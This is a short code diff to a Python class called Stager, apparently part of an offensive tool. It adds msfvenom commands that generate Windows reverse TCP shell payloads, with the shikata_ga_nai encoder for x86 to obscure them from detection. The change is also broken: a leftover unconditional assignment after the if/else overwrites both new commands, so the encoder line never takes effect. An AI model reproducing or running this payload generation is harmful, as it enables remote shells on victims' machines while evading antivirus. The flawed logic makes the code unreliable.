@@ -93,8 +93,13 @@ class Stager(object):
 
         if (arch == "x64"):
             msf_payload = "windows/x64/shell_reverse_tcp"
+            # generate the msfvenom command
+            msf_command = f'msfvenom -p {msf_payload} LHOST={lhost} LPORT={lport} -f {msf_format}'
         else:
+            print("[*] Using Shikata ga nai for this architechture")
             msf_payload = "windows/shell_reverse_tcp"
+            # generate the msfvenom command with SGN
+            msf_command = f'msfvenom -a {arch} --platform windows -p {msf_payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -f {msf_format}'
 
         # generate the msfvenom command
         msf_command = f'msfvenom -p {msf_payload} LHOST={lhost} LPORT={lport} -f {msf_format}'
